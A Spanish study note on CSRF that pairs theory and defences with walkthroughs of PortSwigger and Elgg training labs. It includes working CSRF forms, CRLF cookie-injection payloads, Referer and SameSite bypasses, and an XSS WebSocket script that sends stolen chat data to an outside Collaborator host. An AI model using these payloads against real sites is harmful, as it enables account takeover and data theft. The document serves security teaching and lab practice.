---
aliases: ["CSRF", "XSRF", "Cross-Site Request Forgery", "Falsificación de Peticiones entre Sitios"]
tags:
  - sec/web
  - sec/web/cliente
tipo: concepto
estado: terminado
creado: 2026-10-11
actualizado: 2026-10-11
relacionado:
  - "[[Cross-Site Scripting XSS]]"
  - "[[Clickjacking Ataques]]"
  - "[[Vulnerabilidades CORS y Laboratorios]]"
  - "[[Vulnerabilidades OAuth en PortSwigger Labs]]"
  - "[[HTTP Host header attacks]]"
  - "[[Session Puzzling Session Fixation y Session Variable Overloading]]"
fuente: "https://portswigger.net/web-security/csrf"
---

# Cross-Site Request Forgery (CSRF)

El **Cross-Site Request Forgery** (**CSRF**, pronúnciese "see-surf") es una vulnerabilidad en la que un atacante **engaña al navegador de la víctima** para que emita una petición HTTP **auténtica y autenticada** hacia un sitio que la víctima usa, ejecutando una acción no deseada en su nombre. El navegador adjunta las cookies de sesión automáticamente; el servidor ve una petición legítima; la víctima nunca supo que se envió.

> [!info] Cómo funciona un ataque CSRF
> El atacante lanza un recurso (una página, una imagen, un form autoenviado) que provoca una petición a `https://banco.com/transferir?destino=atacante&cantidad=1000`. Si la víctima tiene sesión abierta en `banco.com` y las cookies viajan con esa petición cross-site (o son aceptadas por el servidor sin más pruebas), la acción se ejecuta. La página del atacante **no lee la respuesta** (la SOP lo impide): el ataque es de **fuerza bruta de acciones**, no de lectura. Es por eso que acciones como transferencias, cambio de email o eliminación de cuentas son los targets clásicos.
>
> Ejemplo canónico: usuario con sesión en su banco visita una web maliciosa cuyo formulario envía `POST /transferir` al banco; con un `<script>document.forms[0].submit()</script>` la transferencia se ejecuta automáticamente si el usuario tiene la sesión activa.

Para prevenir el CSRF, los desarrolladores deben implementar **tokens CSRF**, validación **SameSite**, validación **Origin/Referer** y separación de credenciales (ver prevención). Ojo: los propios tokens CSRF se pueden llegar a usar en contra del atacante… o a saltarse, como veremos.

> [!tip] Tokens CSRF
> Valores secretos y únicos generados por el servidor, incrustados en formularios (campo oculto) o cabeceras. Al recibir la petición, el servidor compara el token enviado con el esperado; si no coinciden, rechaza. La clave es que el atacante **no puede leer** el token de la víctima (SOP), por lo que no puede incluirlo en su petición falsificada. Deben ser únicos por sesión (o por petición) e impredecibles.

**Lab Setup** (laboratorio local de la clase, Elgg): [https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip](https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip)

## Mecánica: qué necesita el servidor para caer

Un servidor vulnerable confía en **una sola señal** para autorizar acciones: "las cookies de la sesión están presentes". No distingue de dónde nació la petición. Los prerrequisitos del ataque:

| Requisito | Detalle | Contramedida correspondiente |
|---|---|---|
| Acción basada en cookies | La sesión vive en cookies (no en headers custom que el navegador no adjunta solo) | Tokens personalizados / cabeceras custom |
| Sin token CSRF (o débil) | El servidor no verifica un secreto inaccesible al atacante | Token en el form + verificación server-side |
| Cookies cross-site aceptadas | Sin `SameSite=Strict/Lax` (o con `None`), o endpoints que aceptan GET autenticado | `SameSite=Lax` por defecto |
| Sin validación Origin/Referer | El servidor no comprueba el origen de la petición | Allowlist de orígenes |
| Acción sin efectos irreversibles protegidos | Transferir, borrar, cambiar credenciales | Re-autenticación / step-up |

### La semántica real de SameSite

`SameSite` es hoy la primera línea de defensa y la que más confusión genera. Definiciones precisas:

| Valor | Envío de cookies | Notas |
|---|---|---|
| `Strict` | Solo peticiones **mismo sitio** | Ni siquiera desde un enlace de otro sitio llegan las cookies; UX fría en links externos |
| `Lax` | Mismo sitio + **navegaciones top-level GET** (click en `<a>`, `GET` de form) | Por defecto en Chrome/Firefox/Safari modernos; **NO** envía cookies en `POST` cross-site, ni en sub-recursos (`<img>`, `fetch`, `iframe` en general) |
| `None` (+`Secure` obligatorio) | Siempre, incluido cross-site | Solo para flujos legítimamente cross-site (embeds, SSO) |
| *(ausente, legacy)* | Como `None`-suave (Chrome lo trata como `Lax` por defecto desde 2020) | Navegadores viejos: envían cookies igual |

> [!warning] Mismo sitio ≠ mismo origen
> **Origen** = esquema + host + puerto. **Sitio** = host (dominio registrable + subdominios), ignorando esquema y puerto (hasta la corrección "schemeful same-site" que añadió el esquema). `https://app.ejemplo.com` y `https://evil.ejemplo.com` son **distintos orígenes** pero **mismo sitio**: `SameSite=Lax/Strict` no protege entre hermanos. Varios labs de abajo explotan exactamente eso.

> [!tip] Tokens no son magia
> Un token CSRF válido garantiza que la petición fue construida con información que solo el sitio (y la víctima) poseen. Pero si el token se puede **leer** (XSS, ver [[Cross-Site Scripting XSS]]), **predecir**, **fijar** (cookie de token aceptada por el servidor) o **omitir** sin que se verifique (validación condicional), la protección se cae. La mayoría de labs de abajo son variantes de "el token existe pero su verificación tiene un agujero".

## Notas de la Práctica (lab local Elgg)

Trabajamos en una máquina con credenciales válidas:

```bash
alice:seedalice
samy:seedsamy
```

Entramos con las credenciales de Alice:

![[Pasted image 20250825191351.png]]

Estamos en la cuenta de Alice. Lo primero: interceptar la petición al cambiar el nombre para ver cómo se tramita:

![[Pasted image 20250825191652.png]]

Vemos los valores y tenemos `__elgg_token` y `__elgg_ts` (timestamp), cada uno con un identificador.

> [!info] `__elgg_token` y `__elgg_ts`
> En Elgg, `__elgg_token` es el token CSRF principal y `__elgg_ts` es un timestamp anti-replay (evita tokens demasiado antiguos). Ambos forman parte de la protección CSRF.

Para testear, cambiamos a `GET` en Repeater y quitamos `__elgg_token` y `__elgg_ts` para ver si son necesarios:

![[Pasted image 20250825191942.png]]

![[Pasted image 20250825192055.png]]

![[Pasted image 20250825192115.png]]

`200 OK` — buena señal — y si revisamos la web veríamos que efectivamente se cambió el nombre del usuario:

![[Pasted image 20250825192203.png]]

Esos dos valores **no se validan** — indicios claros de CSRF.

Intentamos además modificar el identificador para cambiar el nombre de otro usuario (Samy, `id=59`):

![[Pasted image 20250825192429.png]]

`200 OK`, pero la app responde que no tenemos permisos: el id sí se valida contra la sesión.

Ahora los mensajes privados: vemos si interpretan HTML:

![[Pasted image 20250825192914.png]]

![[Pasted image 20250825193104.png]]

El `marquee` no se interpreta pero el `h1` sí. Objetivo: que al abrir Alice el mensaje, se cambie su nombre de perfil a "Beater" mediante un form automático:

![[Pasted image 20250825193356.png]]

Si la imagen no carga, Alice ve una imagen rota; para evitarlo:

![[Pasted image 20250825193552.png]]

Probamos y verificamos:

![[Pasted image 20250825193627.png]]

Funcionó: el nombre cambió por el simple hecho de no validar los tokens. Del mismo modo se podría cambiar cualquier cosa, incluida la contraseña — probamos si `current_password` es obligatorio:

![[Pasted image 20250825194005.png]]

Pasamos a `GET` y eliminamos `current_password`:

![[Pasted image 20250825194217.png]]

No: `current_password` sí está bien validado. El concepto, sin embargo, es el mismo para cualquier otro objetivo.

## Catálogo de variantes de CSRF y sus payloads

| Variante | Señal detectable | Payload/PoC clave |
|---|---|---|
| Sin defensas | Sin token, sin SameSite estricto | Form + `document.forms[0].submit()` |
| Token omitible | `POST` sin campo `csrf` → 200/302 | Form sin el campo del token |
| Validación depende del método | `GET` sin token funciona | Form `method=GET` |
| Token no atado a sesión | Token de la cuenta A funciona en la B | Token fijo robado en el form |
| Token atado a cookie no-sesión | `csrfKey` en cookie aceptada por inyección | `<img src="...?search=...%0d%0aSet-Cookie:...">` + form |
| Token duplicado en cookie | Servidor compara `csrf` form == `csrf` cookie | Fijar ambos con el mismo valor vía CRLF |
| SameSite=Lax | `POST` cross-site sin cookies | `GET` con method override `_method=POST` |
| SameSite=Strict | Ni GET top-level lleva cookies | Redirect chain desde el propio origen |
| Validación Referer "ausencia" | Petición sin `Referer` pasa | `<meta name="referrer" content="no-referrer">` |
| Validación Referer "subcadena" | `Referer` que contiene el dominio pasa | `<meta name="referrer" content="unsafe-url">` + nombre de archivo = dominio |
| OAuth/token refresh | Cookie recién emitida por el flujo SSO | `window.open(social-login)` + `setTimeout(submit)` |

Exploit base reutilizable (cambia URL, método y campos):

```html
<form class="login-form" name="change-email-form"
  action="https://VICTIMA/my-account/change-email" method="POST">
  <input required="" type="email" name="email" value="pwned@hacked.com">
</form>
<script>
  document.forms[0].submit();
</script>
```

## PortSwigger

### Lab: CSRF vulnerability with no defenses

Objetivo: cambiar el correo de un usuario. Capturamos el momento del cambio:

![[Pasted image 20250911094446.png]]

La petición va a `/my-account/change-email` con el valor `email` en el cuerpo. Un usuario con sesión activa debe enviar, desde nuestra web vulnerable, los valores de un formulario por `POST` autoenviado. El formulario lo sacamos de la misma web:

![[Pasted image 20250911094839.png]]

Limpiamos elementos innecesarios (`button`, `label`), fijamos `action` estático y agregamos el autoenvío:

```html
<form class="login-form" name="change-email-form" action="https://0a9b008a03d8ec338143a2b400080084.web-security-academy.net/my-account/change-email" method="POST">
  <input required="" type="email" name="email" value="pwned@hacked.com">
</form>

<script>
  document.forms[0].submit();
</script>
```

En el exploit server de PortSwigger:

![[Pasted image 20250911095725.png]]

Probamos con el correo actual `test@test.com`:

![[Pasted image 20250911095632.png]]
![[Pasted image 20250911095748.png]]

Cambió — enviamos el exploit para completar el lab:

![[Pasted image 20250911095854.png]]

Lab Terminado.

### Lab: CSRF where token validation depends on request method

Interceptamos el cambio de correo:

![[Pasted image 20250911101856.png]]

Además del correo se tramita un token `csrf`. Primero: si lo eliminamos, ¿pasa? No — el token hace falta. Otra prueba común: cambiar el método a `GET`:

![[Pasted image 20250911103151.png]]

Válido (los códigos 3xx son redirecciones, no errores; *follow redirection*):

![[Pasted image 20250911103311.png]]

Si en `GET` el token ya no hace falta:

![[Pasted image 20250911103405.png]]
![[Pasted image 20250911103421.png]]

Web maliciosa con método `GET`:

```html
<form class="login-form" name="change-email-form"
  action="https://0a9400f6046b1e2d81ce76d9001100de.web-security-academy.net/my-account/change-email" method="GET">
  <input required="" type="email" name="email" value="Hacked@hack.com">
</form>

<script>
  document.forms[0].submit();
</script>
```

![[Pasted image 20250911104039.png]]

![[Pasted image 20250911104108.png]]
Lab Terminado.

### Lab: CSRF where token validation depends on token being present

La validación solo ocurre cuando el token está presente: si no lo tiene, la petición pasa:

![[Pasted image 20250911104547.png]]

Eliminamos el parámetro `csrf`:

![[Pasted image 20250911104701.png]]

Pasa. Web maliciosa sin el campo token:

```html
<form class="login-form" name="change-email-form"
  action="https://0af700c9046c20e798d940e500cd00a2.web-security-academy.net/my-account/change-email" method="POST">
  <input required="" type="email" name="email" value="pwned@pwned.com">
</form>

<script>
  document.forms[0].submit();
</script>
```

![[Pasted image 20250911105039.png]]

![[Pasted image 20250911105126.png]]
Lab Terminado.

### Lab: CSRF where token is not tied to user session

Se emplea CSRF de un solo uso, pero mal configurado: los tokens no se asocian a la cuenta que los genera, así que un token generado por una cuenta puede usarse en otra. Nos dan dos usuarios. Obtenemos un CSRF válido de la cuenta `wiener`:

![[Pasted image 20250911111656.png]]

No permitimos que la petición se envíe. Creamos el HTML malicioso con ese token:

```html
<form class="login-form" name="change-email-form"
  action="https://0add00be0470395e81f7de0100c900a0.web-security-academy.net/my-account/change-email" method="POST">
  <input required="" type="email" name="email" value="hacked@hacked.com">
  <input required="" type="hidden" name="csrf" value="14GTTcgepngtpvz6R5Xq2o3TjQq24duq">
</form>

<script>
  document.forms[0].submit();
</script>
```

![[Pasted image 20250911112217.png]]

![[Pasted image 20250911112355.png]]
Lab Terminado.

### Lab: CSRF where token is tied to non-session cookie

Dos usuarios: uno en Firefox y otro en el Chromium de Burp:

![[Pasted image 20250911121735.png]]
![[Pasted image 20250911121747.png]]

Capturamos la petición de cambio de correo de cada uno para comparar cómo se tramita.

Wiener:
![[Pasted image 20250911122008.png]]
Carlos:
![[Pasted image 20250911122142.png]]

Comparando: el `csrf` cambia entre usuarios; el de Wiener arrastra un campo `search` (porque él hizo búsquedas) y el de Carlos no. Probamos: el `csrf` **no** es de un solo uso (se reutiliza); no podemos eliminar campos ni cambiar método; un `csrf` de un usuario no vale en el otro. Pero usando el `csrf` **y** el `csrfKey` (cookie) de Carlos en Wiener, funciona:

![[Pasted image 20250911123108.png]]

Análisis: el `csrf` del formulario podemos ponerlo nosotros, pero el `csrfKey` está en la Cookie y también necesita cambiar — necesitamos una forma de fijar cookies del dominio víctima. La hallamos en la búsqueda: al hacer una búsqueda se usa `lastSearchTerm` en la cookie, y en `Set-Cookie` de la respuesta se refleja. ¿Es inyectable?

![[Pasted image 20250911123707.png]]

![[Pasted image 20250911124418.png]]

![[Pasted image 20250911124945.png]]

Podemos inyectar, pero no interpreta colores (no se refleja el HTML en la respuesta). Intentamos modificar una petición nueva:

![[Pasted image 20250911125108.png]]
![[Pasted image 20250911125303.png]]

En una nueva solicitud, a ver qué nos está arrastrando:

![[Pasted image 20250911125343.png]]

`csrfKey` no cambia en peticiones nuevas: la inyección no se interpreta. Probamos inyectar otro parámetro estilo `Set-Cookie`:

![[Pasted image 20250911125628.png]]

Logramos inyectar otro `Set-Cookie`, pero necesitamos un salto de línea para que se interprete como cabecera nueva. Revisamos ASCII para insertar retorno de carro (`\r`) y nueva línea (`\n`):

![[Pasted image 20250911125939.png]]

Con el decodificador de Burp verificamos la cadena:

![[Pasted image 20250911130056.png]]

Funciona — ahora vemos los colores interpretados y en una petición nueva vemos el cambio:

![[Pasted image 20250911130155.png]]
![[Pasted image 20250911130416.png]]
![[Pasted image 20250911130450.png]]

Armamos la estructura HTML: primero cargar la búsqueda que cambia `csrfKey`, luego enviar el formulario:

```html
<form class="login-form" name="change-email-form"
  action="https://0ae90019046635d9819feded0086004b.web-security-academy.net/my-account/change-email" method="POST">
  <input required="" type="email" name="email" value="Hacked@Hacked">
  <input required="" type="hidden" name="csrf" value="KvvdkmMiwPqmbwg8SdLwOLiWXy4PyYRp">
</form>

<img
  src="https://0ae90019046635d9819feded0086004b.web-security-academy.net/?search=Hola;%20%0d%0aSet-Cookie:%20csrfKey=uz34HoR5Mk1fFn8fEu9IvbgqC7I9de3H;%20SameSite=None"
  onerror="document.forms[0].submit();">
```

Explicación: el formulario define el `csrf` correcto; la `img` dispara primero la búsqueda con inyección CRLF que fija `csrfKey` (con `SameSite=None` para que viaje); al fallar la carga de la imagen, `onerror` envía el formulario.

> [!info] Atributo `SameSite` en Cookies
> - `Strict`: solo mismo sitio, nunca cross-site.
> - `Lax`: mismo sitio + navegaciones top-level `GET`.
> - `None`: todas las peticiones, requiere `Secure`.
> Inyectar `SameSite=None` en `csrfKey` es crucial para que la cookie fijada viaje desde el sitio atacante.

![[Pasted image 20250911134449.png]]

![[Pasted image 20250911134500.png]]
Lab Terminado.

### CSRF con token duplicado en cookie

Tenemos el token duplicado en cookie y formulario:

![[Pasted image 20250911135402.png]]

El servidor no verifica un token válido contra el de sesión — solo comprueba que **los dos campos sean iguales**. Revisamos si `search` tiene la misma inyección:

![[Pasted image 20250911135501.png]]
![[Pasted image 20250911135800.png]]

Mismo concepto del lab anterior con valor arbitrario igual en ambos campos:

```html
<form class="login-form" name="change-email-form"
  action="https://0ae6003c04fa057880f7032a009b003a.web-security-academy.net/my-account/change-email" method="POST">
  <input required="" type="email" name="email" value="Hacked@hacked.com">
  <input required="" type="hidden" name="csrf" value="hacked">
</form>

<img
  src="https://0ae6003c04fa057880f7032a009b003a.web-security-academy.net/?search=Hola;%20%0d%0aSet-Cookie:%20csrf=hacked;%20SameSite=None"
  onerror="document.forms[0].submit();">
```

![[Pasted image 20250911140703.png]]

![[Pasted image 20250911140724.png]]
Lab Terminado.

### Lab: SameSite Lax bypass via method override

Objetivo: tramitar por `GET` (que sí arrastra cookies `SameSite=Lax`) una acción pensada para `POST`:

![[Pasted image 20250911160958.png]]

Pasamos la petición a `GET`:

![[Pasted image 20250911161026.png]]

No funciona tal cual, pero concatenando `_method=POST` puede funcionar:

![[Pasted image 20250911161157.png]]

> [!tip] `_method` Parameter Override
> Algunas apps permiten anular el método HTTP real mediante un parámetro `_method` (común en frameworks RESTful: Rails, Laravel). Si la app procesa el override **después** de decidir si adjunta/comprueba cookies, el atacante envía un `GET` (con cookies `Lax`) que la app trata como `POST`.

```html
<script>
  location = "https://0a0d00e804c10b71808d0d2900ed00c9.web-security-academy.net/my-account/change-email?email=Hacker%40hack.com&_method=POST";
</script>
```

![[Pasted image 20250911161513.png]]
![[Pasted image 20250911161529.png]]
Lab Terminado.

### Lab: SameSite Strict bypass via client-side redirect

Objetivo: cambiar el correo. Capturamos la petición:

![[Pasted image 20250911161939.png]]

No hay `csrf`; la petición por `GET` funciona:

![[Pasted image 20250911162322.png]]

Creamos la web maliciosa y solo llamamos a la web con un script:

![[Pasted image 20250911162449.png]]

En este punto, vemos si se resuelve el lab:

![[Pasted image 20250911162522.png]]

No se resuelve — algo raro está pasando. Vemos cómo se tramita el exploit para entender:

![[Pasted image 20250911163304.png]]

Toda la inyección debe darse **desde el mismo origen**. Buscamos algo que cargue la web desde su origen: al publicar un post, la app se redirige sola tras unos segundos. Tras el historial hay una petición con un script que usa `postId` y `blogPath`:

![[Pasted image 20250911165422.png]]
![[Pasted image 20250911165539.png]]

Probamos si `postId` es controlable:

![[Pasted image 20250911165925.png]]

![[Pasted image 20250911165947.png]]

Sí redirige. Ahora probamos `../my-account` en la ruta:

![[Pasted image 20250911170228.png]]
![[Pasted image 20250911170241.png]]

No nos saca de la cuenta: la cookie viaja. Inyectamos la URL de cambio de correo en el redirect:

![[Pasted image 20250911170548.png]]

Pero el segundo `?` y el `&` dan problemas — codificamos la URL:

![[Pasted image 20250911170748.png]]

![[Pasted image 20250911170818.png]]
Lab Terminado.

### Lab: SameSite Strict bypass via sibling domain

Objetivo: credenciales válidas. Vemos la web:

![[Pasted image 20250911173502.png]]
![[Pasted image 20250911173623.png]]

Escribimos en el chat y responde texto predefinido. El chat usa `/chat` y emite un recurso JS:

![[Pasted image 20250911174328.png]]
![[Pasted image 20250911174815.png]]

En esta petición hay un `Access-Control-Allow-Origin` que carga un dominio diferente. Vamos a revisar qué es eso:

![[Pasted image 20250911175008.png]]

Es un **dominio hermano** (subdominio distinto, mismo *site*). Desde ese hermano, un redirect arrastraría la cookie con `SameSite=Strict` (mismo sitio). Primero intentamos leer el chat vía WebSockets:

![[Pasted image 20250911182109.png]]

El flujo: `READY` y luego mensajes. Script para capturar y exfiltrar:

```html
<script>
  var ws = new WebSocket("/chat");
  ws.onopen = function () {
    ws.send("READY");
  };

  ws.onmessage = function (info) {
    fetch("https://4y36xndfgjd3wp5d7jxd5afnler5fv3k.oastify.com/?data=" + btoa(info.data));
  };
</script>
```

![[Pasted image 20250911194809.png]]

![[Pasted image 20250911195012.png]]

Sí nos llegó al Collaborator la cadena en Base64 — vamos a ver qué contiene:

![[Pasted image 20250911195211.png]]

Es un chat nuevo (sin cookies: SameSite=Strict). Hay que ejecutarlo desde el mismo origen. Regresamos a la web de login:

![[Pasted image 20250911195711.png]]

Refleja el username — probamos XSS:

![[Pasted image 20250911195749.png]]

Funciona. Ejecutamos nuestro script dentro del `username`:

![[Pasted image 20250911195910.png]]
![[Pasted image 20250911200219.png]]

Llega la información de **todas** las conversaciones (arrastra la cookie). Verificamos el contenido:

![[Pasted image 20250911200514.png]]

Tenemos el chat. Ahora interceptamos y probamos desde el navegador:

![[Pasted image 20250911201816.png]]
![[Pasted image 20250911202109.png]]
![[Pasted image 20250911202035.png]]

Armando la petición desde la página maliciosa (payload URL-encoded en el username):

```html
<script>
  location = "https://cms-0a33003004623d1c801f039100240050.web-security-academy.net/login?username=%3Cscript%3E+++var+ws+%3D+new+WebSocket(%22https%3A%2F%2F0a33003004623d1c801f039100240050.web-security-academy.net%2Fchat%22)%3B+++ws.onopen+%3D+function+(){+++++ws.send(%22READY%22)%3B+++}++++ws.onmessage+%3D+function+(info){+++++fetch(%22https%3A%2F%2Fx1zz0gg8jcgwzi86ac0683igo7uyis6h.oastify.com%2F%3Fdata%3D%22+%2B+btoa(info.data))%3B+++}+%3C%2Fscript%3E&password=112341234"
</script>
```

![[Pasted image 20250911202234.png]]

![[Pasted image 20250911202307.png]]

Llega la información — contiene un usuario `carlos` y su contraseña:

![[Pasted image 20250911202530.png]]
![[Pasted image 20250911202645.png]]
Lab Terminado.

### Lab: SameSite Lax bypass via cookie refresh

`SameSite=Lax`. El cambio de email es vulnerable y hay login por **OAuth**:

![[Pasted image 20250911213948.png]]

Flujo: login → redirect → confirmación → home. Lo relevante: el login OAuth emite la cookie de sesión con `Set-Cookie` **sin atributos de seguridad**:

![[Pasted image 20250911215652.png]]

En ese punto la cookie viaja. El cambio de email es vulnerable, pero el form simple no funciona (la víctima puede no tener la cookie recién emitida). Solución: primero cargar el flujo OAuth en una ventana (que refresque la cookie) y luego enviar el formulario:

```html
<form class="login-form" name="change-email-form"
  action="https://0a7b00860326e8e2800203d5000100f4.web-security-academy.net/my-account/change-email" method="POST">
  <input required="" type="email" name="email" value="Hacked@hacked.com">
</form>


<script>
  window.open("https://0a7b00860326e8e2800203d5000100f4.web-security-academy.net/social-login");
  setTimeout(onload, 5000);
  function onload() {
    document.forms[0].submit();
  }
</script>
```

![[Pasted image 20250911221254.png]]

![[Pasted image 20250911221309.png]]
Lab Terminado.

### Lab: CSRF where Referer validation depends on header being present

Objetivo: cambiar el email.

> [!info] Cabecera `Referer`
> (Con la ortografía errónea original.) Indica la página desde la que se realiza la solicitud. Algunas apps la validan para prevenir CSRF: si la petición viene del mismo origen, pasa.

Lo primero: ver cómo se tramita la petición de cambio de email:

![[Pasted image 20250911222054.png]]

No vemos tokens ni SameSite; puede haber validación de Referer. Formulario simple:

```html
<form class="login-form" name="change-email-form"
  action="https://0ada0062036c757c81c6b13100940028.web-security-academy.net/my-account/change-email" method="POST">
  <input required="" type="email" name="email" value="prueba@prueta.com">
</form>

<script>
  document.forms[0].submit();
</script>
```

![[Pasted image 20250911222414.png]]

![[Pasted image 20250911222430.png]]

No funciona; al capturar el exploit vemos que el Referer cambia y causa el rechazo:

![[Pasted image 20250911222617.png]]

Si borramos la cabecera en Repeater, la petición pasa:

![[Pasted image 20250911222751.png]]

Objetivo: quitar el Referer desde el exploit, con `<meta>`:

```html
<html>

<head>
  <meta name="referrer" content="no-referrer">
</head>

<form class="login-form" name="change-email-form"
  action="https://0ada0062036c757c81c6b13100940028.web-security-academy.net/my-account/change-email" method="POST">
  <input required="" type="email" name="email" value="prueba@prueta.com">
</form>

<script>
  document.forms[0].submit();
</script>

</html>
```

> [!tip] Política `no-referrer`
> `<meta name="referrer" content="no-referrer">` indica al navegador no enviar la cabecera en ninguna solicitud saliente — útil contra validaciones que esperan la ausencia de Referer.

![[Pasted image 20250911223657.png]]
![[Pasted image 20250911223643.png]]
Lab Terminado.

### Lab: CSRF with broken Referer validation

Último lab: mismo objetivo, validación de Referer **rota**. Capturamos el cambio de email; sin token:

![[Pasted image 20250911224205.png]]

Formulario automático:

```html
<form class="login-form" name="change-email-form"
  action="https://0a58003b04842cc682bd113f003700d9.web-security-academy.net/my-account/change-email" method="POST">
  <input required="" type="email" name="email" value="Hacked@hack.com">
</form>

<script>
  document.forms[0].submit();
</script>
```

![[Pasted image 20250911224606.png]]

![[Pasted image 20250911224629.png]]

Quitar el Referer no funciona esta vez. Analizamos cómo se valida: quitando caracteres no pasa, pero **agregando** información sí (la validación es por subcadena):

![[Pasted image 20250911224859.png]]
![[Pasted image 20250911225103.png]]
![[Pasted image 20250911225136.png]]

Podemos usar el nombre del archivo como dominio, pero por defecto el navegador recorta el path del Referer; la política `unsafe-url` envía la URL completa incluyendo el path:

> [!warning] Política `unsafe-url`
> `<meta name="referrer" content="unsafe-url">` envía la URL completa (path y query) en el Referer. Es "insegura" por filtrar datos a terceros — pero aquí se explota para que la subcadena del dominio aparezca en el Referer vía el nombre de archivo.

```html
<html>

<head>
  <meta name="referrer" content="unsafe-url">
</head>

<form class="login-form" name="change-email-form"
  action="https://0a58003b04842cc682bd113f003700d9.web-security-academy.net/my-account/change-email" method="POST">
  <input required="" type="email" name="email" value="Hacked@hack.com">
</form>

<script>
  document.forms[0].submit();
</script>

</html>
```

![[Pasted image 20250911230025.png]]

![[Pasted image 20250911230119.png]]
Lab Terminado.

## Detección (defensor)

- WAF/IDS: peticiones de estado (POST/PUT/DELETE) sin cabecera `Origin`/`Referer` esperada, o con `Referer` cross-site hacia rutas de acción.
- Logs: acciones sensibles seguidas de redirect inmediato desde un origen externo (patrón de form autoenviado).
- Auditoría de código: endpoints de acción sin verificación de token ni SameSite.
- Pruebas automatizadas: OWASP ZAP/Burp con checks de CSRF sobre cada form y endpoint de estado.

## Impacto

1. **Acciones autenticadas**: transferencias, cambio de email/contraseña, eliminación de cuenta, publicación de contenido, compras.
2. **Bypass de MFA en flujos sin step-up**: la sesión ya autenticada realiza la acción.
3. **Cascada con XSS**: si el XSS logra leer tokens (o el CSRF fija cookies), ambas vulnerabilidades se potencian (lab de sibling domain).
4. **Account takeover** cuando la acción vulnerable es "cambiar email" o "resetear credenciales" — como en casi todos los labs.

## Prevención (con código)

```python
# Django: token por sesión + validación (se inserta automáticamente en forms)
# {% csrf_token %} en el template; el middleware valida el token en cada POST

# Express + csurf (o doble submit propio)
const csrf = require('csurf')();
app.get('/perfil', csrf, (req, res) =>
  res.render('perfil', { csrfToken: req.csrfToken() }));
app.post('/cambiar-email', csrf, cambiarEmailHandler);   // 403 si el token no valida

# Cookie de sesión con SameSite
res.cookie('session', sid, {
  httpOnly: true, secure: true, sameSite: 'Lax',   // 'Strict' si no hay flujos cross-site
});
```

```http
# Validación de origen (complemento, no sustituto del token)
# Nginx: rechazar POST sin Origin/Referer del propio dominio
if ($request_method ~ "POST") {
    set $bad_origin "1";
    if ($http_origin ~* "(https://)?(www\.)?ejemplo\.com$") { set $bad_origin "0"; }
    if ($http_referer  ~* "^https://(www\.)?ejemplo\.com/")  { set $bad_origin "0"; }
    if ($bad_origin = "1") { return 403; }
}
```

Reglas de diseño (defensa en profundidad):
1. **Token CSRF por sesión** (o por petición), comparado en servidor, incluido en todo form/endpoint de estado; rechazar si falta (no solo si está presente y no coincide — lab "present-only").
2. **`SameSite=Lax`** por defecto en cookies de sesión (+`Secure`+`HttpOnly`). `Strict` si la UX lo permite.
3. **Validación Origin/Referer** como segunda capa: allowlist exacta por comparación de host, **nunca subcadena** (lab "broken Referer").
4. **No aceptar acciones de estado por GET** y rechazar method overrides inesperados (`_method`).
5. **Re-autenticación** para acciones críticas (cambio de email/contraseña, pagos).
6. Ver que los tokens no se dupliquen en cookies legibles (double submit bien implementado: cookie firmada o token de sesión server-side, no comparación ingenua igual-igual).

## Errores comunes

**Atacante:**
1. Enviar el form con el token de tu sesión sin comprobar si está atado a la cuenta de la víctima (labs "not tied to session"/"tied to non-session cookie").
2. Probar solo el form simple y rendirse ante `SameSite=Lax/Strict`: hay bypass conocidos (method override, redirect client-side, hermanos de dominio, cookie refresh).
3. Olvidar el **URL-encoding** en payloads dentro de la URL (el lab de sibling domain lo requiere).
4. No medir si la app acepta el token omitido vs token incorrecto: son comportamientos distintos (present-only).

**Defensor (falsas soluciones):**
1. **Validar el token solo si está presente** — omitir el campo lo salta.
2. **Depender solo de SameSite** — hermanos de dominio, method override, redirects y cookies `None` lo rompen; los navegadores legacy no lo aplican.
3. **Validar Referer por subcadena** (`contains("ejemplo.com")`) — se salta con `evil.com?ejemplo.com` o `unsafe-url`.
4. **Permitir POST vía GET por conveniencia** — Lax solo protege el POST.
5. **Duplicar el token en cookie** sin validar server-side el valor de sesión — el atacante fija ambos con CRLF.
6. Creer que el clickjacking está cubierto por el token CSRF — ver [[Clickjacking Ataques]].

## Cheatsheet

| Bypass | Payload/ajuste |
|---|---|
| Sin defensas | `<form ...><script>document.forms[0].submit()</script>` |
| Token omitible | Form sin campo `csrf` |
| Método | `method=GET` / `_method=POST` override |
| SameSite=Lax | GET top-level + override; OAuth cookie refresh |
| SameSite=Strict | Redirect client-side desde mismo origen; subdominio hermano |
| Referer ausente | `<meta name="referrer" content="no-referrer">` |
| Referer subcadena | `<meta name="referrer" content="unsafe-url">` + path = dominio |
| Cookie fijada | `%0d%0aSet-Cookie:%20csrfKey=X;%20SameSite=None` en parámetro reflejado |
| Token no atado | Robar token de la cuenta A, usarlo en la B |

| Señal | Lectura |
|---|---|
| 302 tras POST sin token | Posible CSRF total |
| Rechazo con Referer cross-site | Validación de Referer — probar ausencia/subcadena |
| Cookies no viajan en POST cross-site | SameSite=Lax — probar bypasses |
| Igualdad form==cookie | Double submit débil |

## Laboratorios y referencias

- PortSwigger Academy — CSRF (todos los labs de arriba): https://portswigger.net/web-security/csrf
- OWASP — CSRF Defense Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
- MDN — SameSite cookies: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite
- Google — schemeful same-site: https://web.dev/schemeful-same-site/

## Relacionadas

- [[Cross-Site Scripting XSS]] — el XSS roba tokens CSRF y convierte cualquier CSRF en acción elegida; los labs combinados lo demuestran
- [[Clickjacking Ataques]] — el otro "engaña al clic": los tokens no detienen el clickjacking
- [[Vulnerabilidades CORS y Laboratorios]] — política del navegador mal configurada que sí permite lectura cross-origin
- [[Vulnerabilidades OAuth en PortSwigger Labs]] — el flujo OAuth como fuente de cookies frescas (lab cookie refresh)
- [[HTTP Host header attacks]] — el Host header es otra señal de origen falsificable
- [[Session Puzzling Session Fixation y Session Variable Overloading]] — fijar cookies de sesión como primitive de ataque
